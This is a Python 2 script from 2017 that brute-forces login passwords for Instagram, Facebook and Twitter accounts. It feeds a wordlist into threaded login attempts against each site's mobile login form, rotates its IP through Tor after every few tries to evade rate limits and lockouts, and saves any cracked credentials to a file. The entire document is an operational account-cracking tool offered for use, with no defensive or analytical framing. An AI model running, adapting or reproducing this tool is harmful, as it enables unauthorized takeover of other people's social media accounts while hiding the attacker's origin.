# Date: 08/09/2017
# Distro: Kali Linux
# Author: Ethical-H4CK3R
# Description: Bruteforce Instagram, Facebook and Twitter
#
#
import os
import time
import argparse
import threading
import subprocess
from platform import platform
from Core.tor import TorManager
from Core.browser import Browser

sites = {
        'twitter':{
          'name':'Twitter',
          'url':'https://m.twitter.com/login/',
          'form1':'session[username_or_email]',
          'form2':'session[password]'
         },

        'facebook':{
          'name':'Facebook',
          'url':'https://mbasic.facebook.com/login.php',
          'form1':'email',
          'form2':'pass'
         },

        'instagram':{
          'name':'Instagram',
          'url':'https://www.instagram.com/accounts/login/?force_classic_login',
          'form1':'username',
          'form2':'password'
          }
}

class Bruter(TorManager,Browser):
 def __init__(self,site,username,wordlist):
  self.site = sites[site]
  self.username = username
  self.wordlist = wordlist
  self.lock = threading.Lock()

  self.ip = None # current ip address
  self.tries = 0
  self.alive = True # is bruter still running
  self.locked = False # for facebook; after a while it locks
  self.isFound = False # is the password found?
  self.siteName = self.site['name']

  self.passlist = [] # temporary storage; holds a max of 5 passwords
  self.recentIps = [] # temporary storage; holds a max of 5 ip addresses

  # for browser
  self.url = self.site['url']
  self.form1 = self.site['form1']
  self.form2 = self.site['form2']

  Browser.__init__(self)
  TorManager.__init__(self)

  self.n = '\033[0m'  # null ---> reset
  self.r = '\033[31m' # red
  self.g = '\033[32m' # green
  self.y = '\033[33m' # yellow
  self.b = '\033[34m' # blue

 def kill(self,msg=None):
  try:
   if self.isFound:
    self.display(msg)
    print '  [-] Password Found'

    with open('Cracked.txt','a') as f:
     f.write('[-] Site: {}\n[-] Username: {}\n[-] Password: {}\n\n'.\
     format(self.siteName,self.username,msg))

   if all([not self.isFound, msg]):
    print '\n  [-] {}'.format(msg)

   self.alive = False
   self.stopTor()
  finally:exit()

 def modifylist(self):
  if len(self.recentIps) == 5:
   del self.recentIps[0]

  # failsafe
  if len(self.recentIps) > 5:
   while all([len(self.recentIps) > 4]):
    del self.recentIps[0]

 def manageIps(self,rec=2):
  ip = self.getIp()
  if ip:
   if ip in self.recentIps:
    self.updateIp()
    self.manageIps()
   self.ip = ip
   self.recentIps.append(ip)
  else:
   if rec:
    self.updateIp()
    self.manageIps(rec-1)
   else:
    self.kill('Lost Connection'.format(self.y,self.r,self.n))

 def changeIp(self):
  self.createBrowser()
  self.updateIp()

  self.manageIps()
  self.modifylist()
  self.deleteBrowser()

 def setupPasswords(self):
  with open(self.wordlist,'r') as passwords:
   for pwd in passwords:
    pwd = pwd.replace('\n','')
    if len(self.passlist) < 5:
     self.passlist.append(pwd)
    else:
     while all([self.alive,len(self.passlist)]):pass
     if not len(self.passlist): # just making sure, because self.alive could be false
      self.passlist.append(pwd)

  # done reading file
  while self.alive:
   if not len(self.passlist):
    self.alive = False

 def attempt(self,pwd):
  with self.lock:
   self.tries+=1

   self.createBrowser()
   html = self.login(pwd)

   if html:
    self.locked = True if '/help/contact/' in html else self.locked # facebook only
    if self.locked:
     self.display(pwd)
     self.kill('{} is {}locked{}, please try again later.'.\
     format(self.username,self.r,self.n))

    if any(['save-device' in html,'home.php' in html]): # facebook only
     self.isFound = True
     self.kill(pwd)

    if all([not self.form1 in html,not self.form2 in html]):
     self.isFound = True
     self.kill(pwd)
    del self.passlist[self.passlist.index(pwd)]
   self.deleteBrowser()

 def run(self):
  self.display()
  time.sleep(1.3)
  threading.Thread(target=self.setupPasswords).start()
  while self.alive:
   bot = None # workers

   for pwd in self.passlist:
    bot = threading.Thread(target=self.attempt,args=[pwd])
    bot.start()

   # wait for bot
   if bot:
    while all([self.alive,bot.is_alive()]):pass
    if self.alive:
     self.changeIp()

 def display(self,pwd=None):
  pwd = pwd if pwd else ''
  ip = self.ip if self.ip else ''
  color = self.r if self.locked else self.g
  creds = self.r if not self.isFound else self.g # credentials color
  attempts = self.tries if self.tries else ''

  subprocess.call(['clear'])
  print '\n  {}[-] Web-Site: {}{}'.format(self.n,self.b,self.siteName)
  print '  {}[-] Proxy Ip: {}{}'.format(self.n,self.b,ip)
  print '  {}[-] Wordlist: {}{}'.format(self.n,self.b,self.wordlist)
  print '  {}[-] Username: {}{}'.format(self.n,creds,self.username.title())
  print '  {}[-] Password: {}{}'.format(self.n,creds,pwd)
  print '  {}[-] Attempts: {}{}'.format(self.n,self.b,attempts)

  if self.siteName == 'Facebook':
   print '  {}[-] Account Locked: {}{}'.format(self.n,color,self.locked)
  print '\n  {}+-------------------+{}\n'.format(self.r,self.n)

  if not ip:
   print '  [-] Obtaining Proxy IP {}...{}'.format(self.g,self.n)
   self.changeIp()
   time.sleep(1.3)
   self.display()

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('site',help='Instagram, Facebook or Twitter')
 args.add_argument('username',help='Email or username')
 args.add_argument('wordlist',help='wordlist')
 args = args.parse_args()

 # assign variables
 engine = Bruter(args.site.lower(),args.username,args.wordlist)

 # does tor exists?
 if not os.path.exists('/usr/sbin/tor'):
  try:engine.installTor()
  except KeyboardInterrupt:engine.kill('Exiting {}...{}'.format(self.g,self.n))
  if not os.path.exists('/usr/sbin/tor'):
   engine.kill('Please Install Tor'.format(engine.y,engine.r,engine.n))

 # does the account exists?
 if not engine.exists(engine.username):
  engine.kill('The Account \'{}\' does not exists'.format(engine.username.title()))

 # start attack
 try:
  engine.run()
 finally:
  if all([not engine.isFound,not engine.locked]):
   engine.kill('Exiting {}...{}'.format(engine.g,engine.n))

if __name__ == '__main__':
 if not 'kali' in platform():
  exit('Kali Linux required')

 if os.getuid():
  exit('root access required')
 else:
  main()
